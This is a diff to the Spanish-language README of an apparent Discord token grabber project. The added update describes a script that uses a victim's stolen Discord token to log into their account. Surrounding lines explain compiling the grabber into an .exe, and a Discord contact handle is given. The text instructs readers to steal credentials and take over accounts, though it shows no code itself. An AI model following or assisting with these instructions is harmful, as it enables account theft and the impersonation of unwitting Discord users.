@@ -31,6 +31,14 @@ Una vez hecho esto lo unico que hacemos sera guardar el codigo. Y listo, tendria
 Si queremos hacer que ese codigo sea un archivo .exe lo unico que haremos sera instalar la siguiente herramienta: https://github.com/brentvollebregt/auto-py-to-exe
 En YouTube hay varios tutoriales que nos enseñan a hacer esto =).
 
+**ACTUALIZACION
+
+Agregue un nuevo archivo llamado **token login script,txt**, **ESTE ARCHIVO NO LO DEBEMOS BORRAR, SOLO DEJAMOS EL SOURCE.PY Y EL .TXT**
+Para que sirve?:
+Las funcion de esto es poder ingresar a la cuenta del usuario al que le sacamos su Token, el archivo tiene pocas lineas de codigo asi que sera muy facil usarlo, solo debemos reemplazar la palabra **TOKEN** que se encuentra en el codigo y ponemos la Token del usuario al que le pasamos nuestro Token Logger.
+
+![image.png](https://github.com/G0ldenD4rk/Discord-Token-Grabber-Logger/blob/main/txt.PNG/)
+
 # Contacto
 
 Discord: **GoldenDark#6040**
